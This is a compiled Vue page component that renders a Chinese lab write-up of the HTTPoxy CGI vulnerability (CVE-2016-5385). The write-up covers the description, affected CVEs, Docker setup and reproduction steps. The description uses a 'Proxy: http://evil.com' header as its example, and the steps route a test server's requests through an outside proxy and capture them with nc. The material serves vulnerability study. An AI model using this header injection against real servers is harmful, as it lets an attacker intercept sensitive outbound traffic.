import{_ as l}from"./plugin-vue_export-helper-c27b6911.js";import{r,o as c,c as n,a as e,b as i,d as o,e as a}from"./app-58e4a7d6.js";const d={},s=a('<h2 id="漏洞描述" tabindex="-1"><a class="header-anchor" href="#漏洞描述" aria-hidden="true">#</a> 漏洞描述</h2><p>根据RFC 3875规定，CGI（fastcgi）要将用户传入的所有HTTP头都加上<code>HTTP_</code>前缀放入环境变量中，而恰好大多数类库约定俗成会提取环境变量中的<code>HTTP_PROXY</code>值作为HTTP代理地址。于是，恶意用户通过提交<code>Proxy: http://evil.com</code>这样的HTTP头，将使用缺陷类库的网站的代理设置为<code>http://evil.com</code>，进而窃取数据包中可能存在的敏感信息。</p><p>PHP5.6.24版本修复了该漏洞，不会再将<code>Proxy</code>放入环境变量中。本环境使用PHP 5.6.23为例。</p><p>参考链接：</p>',4),p={href:"https://httpoxy.org/",target:"_blank",rel:"noopener noreferrer"},h={href:"http://www.laruence.com/2016/07/19/3101.html",target:"_blank",rel:"noopener noreferrer"},g=a(`<h2 id="漏洞影响" tabindex="-1"><a class="header-anchor" href="#漏洞影响" aria-hidden="true">#</a> 漏洞影响</h2><p>该漏洞不止影响PHP，所有以CGI或Fastcgi运行的程序理论上都受到影响。CVE-2016-5385是PHP的CVE，HTTPoxy所有的CVE编号如下：</p><ul><li>CVE-2016-5385: PHP</li><li>CVE-2016-5386: Go</li><li>CVE-2016-5387: Apache HTTP Server</li><li>CVE-2016-5388: Apache Tomcat</li><li>CVE-2016-6286: spiffy-cgi-handlers for CHICKEN</li><li>CVE-2016-6287: CHICKEN’s http-client</li><li>CVE-2016-1000104: mod_fcgi</li><li>CVE-2016-1000105: Nginx cgi script</li><li>CVE-2016-1000107: Erlang inets</li><li>CVE-2016-1000108: YAWS</li><li>CVE-2016-1000109: HHVM FastCGI</li><li>CVE-2016-1000110: Python CGIHandler</li><li>CVE-2016-1000111: Python Twisted</li><li>CVE-2016-1000212: lighttpd</li></ul><h2 id="环境搭建" tabindex="-1"><a class="header-anchor" href="#环境搭建" aria-hidden="true">#</a> 环境搭建</h2><p>Vulhub启动一个基于PHP 5.6.23 + GuzzleHttp 6.2.0的应用：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>docker-compose up -d
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div>`,6),u={href:"https://github.com/vulhub/vulhub/blob/master/cgi/CVE-2016-5385/www/index.php",target:"_blank",rel:"noopener noreferrer"},b=a('<h2 id="漏洞复现" tabindex="-1"><a class="header-anchor" href="#漏洞复现" aria-hidden="true">#</a> 漏洞复现</h2><p>正常请求<code>http://your-ip:8080/index.php</code>，可见其Origin为当前请求的服务器，二者IP相等：</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/image-20230418152204987.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>在其他地方启动一个可以正常使用的http代理，如<code>http://*.*.122.65:8888/</code>。</p><p>附带<code>Proxy: http://*.*.122.65:8888/</code>头，再次访问<code>http://your-ip:8080/index.php</code>：</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/image-20230418152215384.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>如上图，可见此时的Origin已经变成<code>*.*.122.65</code>，也就是说真正进行HTTP访问的服务器是<code>*.*.122.65</code>，也就是说<code>*.*.122.65</code>已经将正常的HTTP请求代理了。</p><p>在<code>*.*.122.65</code>上使用NC，就可以捕获当前请求的数据包，其中可能包含敏感数据：</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/image-20230418152222274.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure>',9),m=e("details",{class:"details-reset details-overlay details-overlay-dark",id:"jumpto-line-details-dialog",style:{"box-sizing":"border-box",display:"block"}},[e("summary",{"data-hotkey":"l","aria-label":"Jump to line",role:"button",style:{"box-sizing":"border-box",display:"list-item",cursor:"pointer","list-style":"none",transition:"color 80ms cubic-bezier(0.33, 1, 0.68, 1) 0s, background-color, box-shadow, border-color"}})],-1);function _(f,x){const t=r("ExternalLinkIcon");return c(),n("div",null,[s,e("ul",null,[e("li",null,[e("a",p,[i("https://httpoxy.org/"),o(t)])]),e("li",null,[e("a",h,[i("http://www.laruence.com/2016/07/19/3101.html"),o(t)])])]),g,e("p",null,[i("Web页面原始代码："),e("a",u,[i("index.php"),o(t)])]),b,m])}const E=l(d,[["render",_],["__file","HTTPoxy CGI 漏洞 CVE-2016-5385.html.vue"]]);export{E as default};
